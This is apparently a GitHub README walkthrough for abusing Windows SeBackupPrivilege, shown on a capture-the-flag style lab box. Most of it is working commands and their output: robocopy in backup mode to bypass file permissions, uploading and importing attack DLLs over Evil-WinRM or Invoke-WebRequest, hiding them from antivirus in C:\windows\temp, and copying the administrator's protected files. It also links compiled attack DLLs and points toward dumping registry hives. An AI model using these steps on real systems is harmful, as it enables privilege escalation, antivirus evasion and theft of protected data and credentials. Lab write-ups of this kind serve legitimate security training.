# SeBackupPrivilege
Fastest method to exploit the SeBackupPrivilege in a windows AD or standalone env 
# the `fastest X 10000 way` to read root flag is by using robocopy command damn it  😑 😑 😑
```
robocopy c:\users\administrator\desktop "C:\users\public\downloads" root.txt /mt /z /b

*Evil-WinRM* PS C:\windows\temp> robocopy c:\users\administrator\desktop "C:\users\public\downloads" root.txt /mt /z /b
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------
  Started : Tuesday, October 1, 2024 12:02:07 PM
   Source : c:\users\administrator\desktop\
     Dest : C:\users\public\downloads\

    Files : root.txt

  Options : /DCOPY:DA /COPY:DAT /B /MT:8 /R:1000000 /W:30
------------------------------------------------------------------------------

            New File                  34        c:\users\administrator\desktop\root.txt
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :        34        34         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Tuesday, October 1, 2024 12:02:07 PM

*Evil-WinRM* PS C:\windows\temp> dir c:\users\public\downloads\


    Directory: C:\users\public\downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         10/1/2024  11:40 AM             34 root.txt


*Evil-WinRM* PS C:\windows\temp> type c:\users\public\downloads\root.txt
7213....a..2ddd...batman.......

N/B: The most important is /b, where
/b- Copies files in backup mode. In backup mode, robocopy overrides file and folder permission settings (ACLs), which might otherwise block access.
```

#  abusing SeBackupPrivilege with dlls (not fast as robocopy))
```
The Backup Operators is a Windows built-in group. Users which are part of this group have permissions to perform backup and restore operations. More specifically, these users have the _SeBackupPrivilege_ assigned which enables them to read sensitive files from the domain controller i.e. Security Account Manager (SAM).

There are many ways to abuse SeBackupPrivilege, but the fastest one is this one if u need it, no need of the SAM and SYSTEM files, 

In order to exploit `SeBackupPrivilege` you will need to have:

- Enable the privilege.  
    This alone lets you traverse (`cd` into) any directory, local or remote, and list (`dir`, `Get-ChildItem`) its contents.

*Evil-WinRM* PS C:\windows\temp> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\windows\temp> 

- If you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software. The shell `copy` command won't work; you'll need to open the source file manually using `CreateFile` making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.

This library exposes three PowerShell CmdLets that do just that.

## This method focus most on reading administrative file such as root.txt  and sensitive info owned by administrator

##### step to reproduce this one
STEP 1:  We will need two malicious compiled binaries 

i.e i) SeBackupPrivilegeCmdLets.dll and ii)SeBackupPrivilegeUtils.dll


STEP 2: Upload to the target machine

### for winrm
powershell> upload SeBackupPrivilegeCmdLets.dll
powershell> upload SeBackupPrivilegeUtils.dll
N/B: One of the challenge i got with this malicious file is that the AV was blocking me from uploading into a normal directory so i had to find a best place where this AntiVirus(AV) could not delete them which was 'C:\windows\temp\'.
OUTPUT:
*Evil-WinRM* PS C:\windows\temp> upload SeBackupPrivilegeUtils.dll
Info: Uploading /home/alienx/Desktop/MACHINES/SEASON-6/CICADA/SeBackupPrivilegeUtils.dll to C:\windows\temp\SeBackupPrivilegeUtils.dll
Data: 21844 bytes of 21844 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\windows\temp> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading /home/alienx/Desktop/MACHINES/SEASON-6/CICADA/SeBackupPrivilegeCmdLets.dll to C:\windows\temp\SeBackupPrivilegeCmdLets.dll
Data: 16384 bytes of 16384 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\windows\temp> dir
    Directory: C:\windows\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/23/2024   9:36 AM                vmware-SYSTEM
-a----         10/1/2024   8:54 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----         10/1/2024   8:54 AM          16384 SeBackupPrivilegeUtils.dll
-a----         10/1/2024   8:18 AM            102 silconfig.log
-a----         9/23/2024  10:01 AM         161031 vmware-vmsvc-SYSTEM.log
-a----         9/23/2024   9:54 AM          14662 vmware-vmtoolsd-administrator.log
-a----         10/1/2024   8:18 AM          16130 vmware-vmtoolsd-SYSTEM.log
-a----         9/23/2024  10:01 AM          51472 vmware-vmusr-administrator.log
-a----         10/1/2024   8:18 AM          14873 vmware-vmvss-SYSTEM.log
*Evil-WinRM* PS C:\windows\temp> 
N/B: You should note that incase if there is AV this binaries will be deleted vert fast as the AV will detect them as malicious files, So you need to find the best location where the AV is absent, In my case it was 'C:\windows\Temp\'

## for a powershell U  can use the command above to upload this dll files
ps1> Invoke-WebRequest -Uri http://10.10.14.27:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll
ps1> Invoke-WebRequest -Uri http://10.10.14.27:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll


STEP 3:  Importing our dll files
## we need to check if this files are present
*Evil-WinRM* PS C:\windows\temp> dir
    Directory: C:\windows\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/23/2024   9:36 AM                vmware-SYSTEM
-a----         10/1/2024   8:54 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----         10/1/2024   8:54 AM          16384 SeBackupPrivilegeUtils.dll
-a----         10/1/2024   8:18 AM            102 silconfig.log
-a----         9/23/2024  10:01 AM         161031 vmware-vmsvc-SYSTEM.log
-a----         9/23/2024   9:54 AM          14662 vmware-vmtoolsd-administrator.log
-a----         10/1/2024   8:18 AM          16130 vmware-vmtoolsd-SYSTEM.log
-a----         9/23/2024  10:01 AM          51472 vmware-vmusr-administrator.log
-a----         10/1/2024   8:18 AM          14873 vmware-vmvss-SYSTEM.log

*Evil-WinRM* PS C:\windows\temp> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\windows\temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\windows\temp> set-SeBackupPrivilege
*Evil-WinRM* PS C:\windows\temp> Get-SeBackupPrivilege



STEP 4: Copying and Reading senstive files
*Evil-WinRM* PS C:\windows\temp> Copy-FileSeBackupPrivilege  C:\users\administrator\Desktop\root.txt C:\windows\temp\flag.txt -Overwrite
*Evil-WinRM* PS C:\windows\temp> dir 


    Directory: C:\windows\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/23/2024   9:36 AM                vmware-SYSTEM
-a----         10/1/2024   9:00 AM             34 flag.txt
-a----         10/1/2024   8:54 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----         10/1/2024   8:54 AM          16384 SeBackupPrivilegeUtils.dll
-a----         10/1/2024   8:18 AM            102 silconfig.log
-a----         9/23/2024  10:01 AM         161031 vmware-vmsvc-SYSTEM.log
-a----         9/23/2024   9:54 AM          14662 vmware-vmtoolsd-administrator.log
-a----         10/1/2024   8:18 AM          16130 vmware-vmtoolsd-SYSTEM.log
-a----         9/23/2024  10:01 AM          51472 vmware-vmusr-administrator.log
-a----         10/1/2024   8:18 AM          14873 vmware-vmvss-SYSTEM.log

*Evil-WinRM* PS C:\windows\temp> type flag.txt
a4a96.....ef2e69f......

## addition
If your interested to proceed futher from here,you can try to read windows registry hives and dump them on your local machine and get access administrator
```

# malicious dlls
The dlls can be found here 
[compiled dlls](https://github.com/alien-keric/compiled-dll)

## reference
[ms-reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672)

[robocopy-command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)

